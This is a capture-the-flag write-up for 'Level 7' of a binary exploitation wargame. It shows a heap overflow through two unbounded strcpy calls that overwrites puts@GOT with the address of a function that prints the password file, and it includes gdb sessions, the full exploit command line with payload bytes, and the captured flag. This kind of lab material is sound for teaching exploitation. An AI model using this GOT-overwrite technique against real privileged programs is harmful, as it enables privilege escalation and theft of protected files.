# Level 7

Same recon as level0: SUID **level8**.

## Analysis

```c
char c[80];   // global

void m(void) { printf("%s - %d\n", c, time(NULL)); }   // prints c, never called

int main(int argc, char **argv) {
    int **a = malloc(8);  a[1] = malloc(8);
    int **b = malloc(8);  b[1] = malloc(8);
    strcpy((char*)a[1], argv[1]);     // unbounded
    strcpy((char*)b[1], argv[2]);     // dest is a pointer we can corrupt
    fgets(c, 0x44, fopen("/home/user/level8/.pass", "r"));   // flag into c
    puts("~~");                        // libc call through the GOT
}
```

The chunks land in order `a, a[1], b, b[1]`. The first `strcpy` is unbounded, so overflowing `a[1]` reaches `b[1]` and rewrites that pointer. The **second** `strcpy` then writes `argv[2]` to wherever `b[1]` now points.

> **Chained write.** Two `strcpy`s with no size check let us write anywhere: the first overflow picks where the second one writes. No format string needed.

Plan: point `b[1]` at the `puts` GOT entry, then let the second strcpy write `m`'s address there. `puts("~~")` then runs `m`, which prints `c` (the flag fgets just loaded).

`m` and `puts@GOT`:

```
(gdb) info functions
0x080484f4  m
$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

## Exploit

### Padding: from the strcpy1 target to the b[1] pointer

Be careful with names here. `a[1]` and `b[1]` are pointers, and each has two different addresses:

- its **value**: the chunk it points to (where a `strcpy` writes).
- its **storage**: the slot on the heap that holds the pointer itself (`&b[1]` = `b + 4`).

The first `strcpy` writes to the **value** of `a[1]`. What we want to corrupt is the **storage** of `b[1]`, so that the second `strcpy` writes to a location of our choice. So the padding is:

```
&b[1] (storage of the b[1] pointer)  -  a[1] value (target of strcpy1)
```

The four malloc chunks come back in `eax` one after another. Break right after malloc #2 (gives the value of `a[1]`) and after malloc #3 (gives `b`, so `&b[1] = b + 4`):

```
(gdb) b *0x08048550        # after a[1] = malloc(8)
(gdb) b *0x08048565        # after b    = malloc(8)
(gdb) run AAAA BBBB
Breakpoint 1 ...
(gdb) p/x $eax
$1 = 0x804a018             <- a[1] value = target of strcpy1
(gdb) c
Breakpoint 2 ...
(gdb) p/x $eax
$2 = 0x804a028            <- b
(gdb) p/x $eax + 4
$3 = 0x804a02c           <- &b[1], the pointer we overwrite
(gdb) p/d 0x804a02c - 0x804a018
$4 = 20
```

Padding = `0x804a02c - 0x804a018` = `0x14` = **20 bytes**.

> Do not confuse `&b[1]` (`0x804a02c`, where the pointer lives) with the value of `b[1]` (`0x804a038`, the chunk it points to). The distance between the two *values* is 32 bytes and is not what the exploit uses; the padding is the distance to the pointer's **storage**, 20 bytes.

### Run

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1776694943
```

- `argv[1]` = 20 padding + `\x28\x99\x04\x08` (puts@GOT) → first strcpy sets `b[1]` = puts@GOT.
- `argv[2]` = `\xf4\x84\x04\x08` (m) → second strcpy writes m into puts@GOT.
- `puts("~~")` looks up its address in the GOT → now runs `m` → prints the flag (the `- 1776694943` is `time(NULL)`).

Both addresses are null-byte-free, so they survive as command-line args.

Flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
